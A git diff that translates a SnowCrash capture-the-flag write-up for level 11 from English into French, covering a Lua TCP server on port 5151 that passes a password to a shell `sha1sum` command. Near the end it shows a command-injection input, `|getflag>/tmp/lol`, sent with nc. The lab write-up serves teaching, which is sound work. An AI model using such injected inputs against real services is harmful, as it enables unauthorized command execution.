@@ -1,6 +1,6 @@
-# Level 11
+# 11 - Lua exploit: user input
 
-- We login as user level11.
+- On se connecte en tant que level11.
 ```
 level11@SnowCrash:~$ ls -l
 total 4
@@ -8,7 +8,7 @@ total 4
 ```
 
 
-- A lua script has been left to us, let's `cat level11.lua`:
+- Un script lua nous a été laissé:
 ```lua
 #!/usr/bin/env lua
 local socket = require("socket")
@@ -47,14 +47,14 @@ end
 ```
 
 
-- This script defines a TCP server listening on 127.0.0.1 through port 5151. It prompts clients attempting to connect, asking for a password, which is then passed to a hashing function. The hash result is compared, and the server responds accordingly.
+- Se script définit un serveur TCP écoutant sur 127.0.0.1 à travers le port 5151. Il demande aux clients tentant de se connecter un mot de passe, qui est ensuite passé à une fonction de hashage. Le résultat du hash est comparé, et le serveur répond en conséquence.
 ```
 level12@SnowCrash:~$ netstat -tunlp | grep 5151
 tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
 ```
 
-
-- There is indeed a server listening on 127.0.0.1 through port 5151. What interests us here is the hashing function. This function executes `echo "..pass.." | sha1sum`, then puts the output of this command into the file descriptor assigned to `prog`, so:
+- Il y a bien un serveur écoutant sur 127.0.0.1 à travers le port 5151.
+- Ce qui nous intéresse ici est la fonction de hashage. Cette fonction exécute `echo "..pass.." | sha1sum`, (`pass` étant le mot de passe donné au serveur), du coup:
 ```
 level11@SnowCrash:~$ nc 127.0.0.1 5151
 Password:|getflag>/tmp/lol
